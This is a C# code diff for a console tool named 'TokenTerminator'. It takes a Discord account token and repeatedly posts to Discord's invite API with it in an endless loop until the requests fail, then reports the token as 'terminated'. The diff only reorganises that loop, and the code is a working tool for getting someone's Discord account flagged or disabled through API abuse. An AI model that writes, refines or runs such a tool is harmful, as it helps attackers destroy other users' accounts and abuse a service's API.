@@ -20,7 +20,7 @@ namespace TokenTerminator
 			Console.Write("Whats The Token You Want To Terminate: ");
 			string token = Console.ReadLine();
 			DiscordClient client = new DiscordClient();
-		    try
+		    	try
 			{
 				client.Token = token;
 			}
@@ -34,23 +34,19 @@ namespace TokenTerminator
 			Console.ReadLine();
 			Console.WriteLine("Getting Prepared For Termination...");
 
-			using (HttpRequest req = new HttpRequest())
+			while (true)
 			{
-				while (true)
+				try 
 				{
-					try
-					{
-						req.AddHeader("Authorization", token);
-						req.Post("https://discordapp.com/api/v6/invite/minecraft");
-						client.Token = token;
-					}
-
-					catch (Exception)
-					{
-						Console.WriteLine("Token Got Succesfully Terminated");
-						Console.ReadLine();
-						Environment.Exit(0);
-					}
+					HttpRequest req = new HttpRequest();
+					req.AddHeader("Authorization", token);
+					req.Post("https://discordapp.com/api/v6/invite/minecraft");
+				}
+				catch
+				{
+					Console.WriteLine("Token Got Succesfully Terminated");
+					Console.ReadLine();
+					Environment.Exit(0);
 				}
 			}
 		}
